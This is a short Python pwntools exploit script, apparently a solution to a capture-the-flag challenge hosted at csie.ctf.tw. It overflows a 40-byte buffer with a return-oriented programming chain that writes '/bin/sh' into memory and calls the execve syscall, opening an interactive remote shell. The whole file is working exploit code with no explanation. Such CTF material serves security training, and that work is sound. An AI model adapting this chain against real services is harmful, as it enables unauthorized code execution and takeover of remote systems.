from pwn import *

context.arch = "amd64"
offset = 40
writemem = 0x000000000047a502 # mov [rdi] rsi
pop_rdi = 0x0000000000401456
pop_rsi = 0x0000000000401577
data = 0x6c9a20
pop_rax_rdx_rbx = 0x0000000000478516
sys = 0x00000000004671b5

r = remote('csie.ctf.tw', 10130)

rop = flat([pop_rdi, data, pop_rsi, "/bin/sh\x00", writemem, pop_rsi, 0, pop_rax_rdx_rbx, 0x3b, 0, 0, sys])

print(r.recvuntil(":"))
r.sendline('a'*offset + rop)
r.interactive()
